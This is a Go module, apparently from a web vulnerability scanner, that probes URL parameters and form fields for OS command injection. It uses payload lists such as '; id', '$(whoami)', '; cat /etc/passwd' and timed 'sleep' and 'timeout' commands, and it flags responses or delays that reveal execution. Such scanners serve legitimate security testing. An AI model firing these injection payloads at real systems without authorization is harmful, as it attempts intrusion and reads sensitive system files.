package modules

import (
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type cmdiResponsePayload struct {
	Payload string
	Markers []string
}

var cmdiResponsePayloads = []cmdiResponsePayload{
	{"; id", []string{"uid=", "gid=", "groups="}},
	{"| id", []string{"uid=", "gid=", "groups="}},
	{"$(id)", []string{"uid=", "gid=", "groups="}},
	{"`id`", []string{"uid=", "gid=", "groups="}},
	{"&& id", []string{"uid=", "gid=", "groups="}},
	{"; whoami", []string{"root", "www-data", "apache", "nginx", "nobody", "daemon"}},
	{"| whoami", []string{"root", "www-data", "apache", "nginx", "nobody", "daemon"}},
	{"$(whoami)", []string{"root", "www-data", "apache", "nginx", "nobody", "daemon"}},
	{"; cat /etc/passwd", []string{"root:x:", "nobody:x:", "/bin/bash", "/bin/sh", "/sbin/nologin"}},
	{"| cat /etc/passwd", []string{"root:x:", "nobody:x:", "/bin/bash", "/bin/sh", "/sbin/nologin"}},
	{"& whoami", []string{"nt authority\\", "system32", "administrator"}},
	{"| type C:\\Windows\\win.ini", []string{"[fonts]", "[extensions]", "[mci extensions]"}},
}

type cmdiTimedPayload struct {
	Payload string
	Sleep   int
	OS      string
}

var cmdiTimedPayloads = []cmdiTimedPayload{
	{"; sleep 4", 4, "Unix"},
	{"| sleep 4", 4, "Unix"},
	{"$(sleep 4)", 4, "Unix"},
	{"`sleep 4`", 4, "Unix"},
	{"&& sleep 4", 4, "Unix"},
	{"; ping -c 4 127.0.0.1", 4, "Unix"},
	{"& timeout /T 4 /NOBREAK", 4, "Windows"},
	{"| timeout /T 4 /NOBREAK", 4, "Windows"},
}

func ScanCmdInjection(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if cfg.Verbose {
			output.Verbose("[cmdi-get] param=%s", param)
		}
		baseline, _, err := core.DoGET(client, cfg, target.URL)
		if err != nil || baseline == "" {
			continue
		}

	CMDiURLResp:
		for _, pl := range cmdiResponsePayloads {
			testURL, err := core.SetParam(target.URL, param, pl.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}
			for _, marker := range pl.Markers {
				if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
					results = append(results, core.ScanResult{
						Type: "Command Injection",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: pl.Payload, Severity: "CRITICAL",
						Evidence:  fmt.Sprintf("marker %q reflected in response (HTTP %d)", marker, status),
						Timestamp: time.Now(),
					})
					break CMDiURLResp
				}
			}
		}

		if !containsResultForParam(results, "Command Injection", target.URL, param) {
			tb0 := time.Now()
			_, _, baseErr := core.DoGET(client, cfg, target.URL)
			baseTime := time.Since(tb0)
			if baseErr != nil {
				continue
			}

		CMDiURLTime:
			for _, pl := range cmdiTimedPayloads {
				testURL, err := core.SetParam(target.URL, param, pl.Payload)
				if err != nil {
					continue
				}
				t0 := time.Now()
				_, status, err := core.DoGET(client, cfg, testURL)
				elapsed := time.Since(t0)
				if err != nil {
					continue
				}
				margin := time.Duration(float64(pl.Sleep) * 0.7 * float64(time.Second))
				if elapsed-baseTime >= margin {
					results = append(results, core.ScanResult{
						Type: "Command Injection (Blind/Time-Based)",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: pl.Payload, Severity: "CRITICAL",
						Evidence:  fmt.Sprintf("delay %v >= margin %v [%s] HTTP=%d", elapsed.Round(time.Millisecond), margin, pl.OS, status),
						Timestamp: time.Now(),
					})
					output.VulnInline("CMDI-BLIND", "GET param=%s delay=%v\n", param, elapsed.Round(time.Millisecond))
					break CMDiURLTime
				}
			}
		}
	}

	for _, form := range target.Forms {
		var baseline string
		var baseErr error
		if form.Method == "POST" {
			baseline, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
		} else {
			u, _ := core.SetFormParams(form.Action, core.FormDefaults(form))
			baseline, _, baseErr = core.DoGET(client, cfg, u)
		}
		if baseErr != nil || baseline == "" {
			continue
		}
		for _, inp := range form.Inputs {
			if cfg.Verbose {
				output.Verbose("[cmdi-form] %s %s input=%s\n", form.Method, form.Action, inp.Name)
			}

		CMDiFormResp:
			for _, pl := range cmdiResponsePayloads {
				var body string
				var status int
				var err error
				if form.Method == "POST" {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					body, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					u, _ := core.SetFormParams(form.Action, d)
					body, status, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}
				for _, marker := range pl.Markers {
					if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
						results = append(results, core.ScanResult{
							Type: "Command Injection via core.Form",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: pl.Payload, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("marker %q reflected in response (HTTP %d)", marker, status),
							Timestamp: time.Now(),
						})
						break CMDiFormResp
					}
				}
			}

			if !containsResultForInput(results, "Command Injection", form.Action, inp.Name) {
				tb0 := time.Now()
				var baseErr error
				if form.Method == "POST" {
					_, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
				} else {
					d := core.FormDefaults(form)
					u, _ := core.SetFormParams(form.Action, d)
					_, _, baseErr = core.DoGET(client, cfg, u)
				}
				baseTime := time.Since(tb0)
				if baseErr != nil {
					continue
				}

			CMDiFormTime:
				for _, pl := range cmdiTimedPayloads {
					t0 := time.Now()
					var status int
					var err error
					if form.Method == "POST" {
						d := core.FormDefaults(form)
						d.Set(inp.Name, pl.Payload)
						_, status, err = core.DoPOST(client, cfg, form.Action, d)
					} else {
						d := core.FormDefaults(form)
						d.Set(inp.Name, pl.Payload)
						u, _ := core.SetFormParams(form.Action, d)
						_, status, err = core.DoGET(client, cfg, u)
					}
					elapsed := time.Since(t0)
					if err != nil {
						continue
					}
					margin := time.Duration(float64(pl.Sleep) * 0.7 * float64(time.Second))
					if elapsed-baseTime >= margin {
						results = append(results, core.ScanResult{
							Type: "Command Injection via core.Form (Blind/Time-Based)",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: pl.Payload, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("delay %v >= margin %v [%s] HTTP=%d", elapsed.Round(time.Millisecond), margin, pl.OS, status),
							Timestamp: time.Now(),
						})
						output.VulnInline("CMDI-FORM-BLIND", "%s %s input=%s delay=%v\n", form.Method, form.Action, inp.Name, elapsed.Round(time.Millisecond))
						break CMDiFormTime
					}
				}
			}
		}
	}

	return results
}

func containsResultForParam(results []core.ScanResult, typ, rawURL, param string) bool {
	want := core.StripQuery(rawURL)
	for _, r := range results {
		if r.Parameter == param && strings.HasPrefix(r.Type, typ) && core.StripQuery(r.URL) == want {
			return true
		}
	}
	return false
}

func containsResultForInput(results []core.ScanResult, typ, action, input string) bool {
	for _, r := range results {
		if r.Parameter == input && r.URL == action && strings.HasPrefix(r.Type, typ) {
			return true
		}
	}
	return false
}
